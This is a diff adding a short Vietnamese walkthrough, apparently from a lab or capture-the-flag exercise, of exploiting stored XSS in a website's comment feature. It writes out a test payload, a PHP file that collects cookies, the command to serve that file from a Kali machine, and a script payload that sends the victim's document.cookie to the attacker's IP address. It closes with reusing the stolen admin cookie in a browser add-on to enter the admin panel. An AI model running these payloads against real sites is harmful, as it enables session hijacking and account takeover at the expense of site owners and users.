@@ -1,0 +1,24 @@
+Phát hiện lỗ hổng XSS nằm tại chức năng comment với câu lệnh sau:
+<script>alert('XSS')</script>
+
+Tiến hành tạo file index.php để lấy cookie admin:
+#################################################
+<?php
+
+$cookie = isset($_GET['test'])?$_GET['test']:"";
+
+?>
+
+#################################################
+
+Sử dụng câu lệnh php sau trên máy Kali linux để khởi động dịch vụ website php:
+
+php -S 192.168.27.160:80
+
+Quay trở lại website, thực hiện đoạn code javascript sau để khai thác lỗ hổng XSS:
+
+<script>location.href='http://192.168.27.160/index.php?test='+document.cookie;</script>
+
+Kiểm tra trên terminal đang chạy website, thông tin cookie admin đã được lấy về máy attacker.
+
+Sử dụng add-on "Cookie Manager Plus" để sử dụng cookie admin và truy cập vào trang quản trị website.
